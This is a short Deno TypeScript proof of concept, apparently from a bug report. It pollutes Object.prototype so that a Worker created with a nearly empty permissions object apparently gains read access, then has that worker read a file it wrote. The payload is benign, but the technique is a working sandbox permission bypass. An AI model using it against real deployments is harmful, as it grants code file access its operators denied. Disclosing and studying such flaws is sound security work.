// Create worker on the fly
Deno.writeTextFileSync(
  "./worker.ts",
  "console.log(await Deno.permissions.query({ name: 'read' }));" +
  "console.log('Worker code:', Deno.readTextFileSync('./worker.ts'));" +
  "Deno.exit(1);",
  { create: true },
);


// PoC
function pollute(key: string, value: any) {
  ((((Object as any).prototype as any)[key]) as any) = value;
}

pollute("read", true);
new Worker(
  import.meta.resolve("./worker.ts"),
  { type: "module", deno: { permissions: {/*some object*/} } },
);
